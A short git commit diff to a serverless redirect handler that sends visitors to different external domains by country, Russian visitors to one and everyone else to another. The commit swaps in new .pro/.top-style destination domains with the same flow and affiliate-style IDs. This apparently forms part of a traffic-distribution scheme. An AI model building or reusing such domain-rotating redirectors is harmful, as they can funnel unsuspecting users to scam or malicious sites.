b3b4043805653c135265fadd58f27e6478284d6c
nbahrom123-spec <nbahrom123@gmail.com>
2026-01-01 03:09:17 +0500

    Update redirect.js
    1

--- api/redirect.js
+++ api/redirect.js
@@ -6,8 +6,8 @@ export default async function handler(req) {
   const country = req.headers.get("x-vercel-ip-country") || "XX";
 
   if (country === "RU") {
-    return Response.redirect("https://newwebl.pro/client.php?flow=254249-271966-1", 302);
+    return Response.redirect("https://smarts-tg.com/client.php?flow=254249-272409-1", 302);
   }
 
-  return Response.redirect("https://sisuny.top/click?o=2&a=1551", 302);
+  return Response.redirect("https://jgmila.top/click?o=2&a=1551", 302);
 }
